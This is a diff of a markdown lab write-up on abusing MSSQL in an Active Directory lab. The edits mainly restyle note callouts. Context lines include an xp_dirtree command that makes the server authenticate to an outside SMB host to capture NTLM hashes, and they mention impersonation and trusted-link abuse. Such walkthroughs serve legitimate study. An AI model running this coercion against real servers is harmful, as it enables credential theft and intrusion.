@@ -168,8 +168,9 @@ JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id W
 - The previous command list all users with impersonation permission
 
 > What is the hell ? login and user, what is the difference ?
-- A "Login" grants the principal entry into the **SERVER**
-- A "User" grants a login entry into a single **DATABASE**
+> - A "Login" grants the principal entry into the **SERVER**
+> - A "User" grants a login entry into a single **DATABASE**
+{: .prompt-info }
 
 - I found out an image who explain it well and also a very nice summary [here](https://blog.sqlauthority.com/2019/05/21/sql-server-difference-between-login-vs-user-security-concepts/)
 
@@ -283,6 +284,7 @@ exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
 - Another SQL abuse we could try on the lab, is the usage of mssql trusted links.
 
 > Note that trusted link is also a forest to forest technique
+{: .prompt-tip }
 
 - To abuse the links let's connect with jon.snow and use enum_links
 
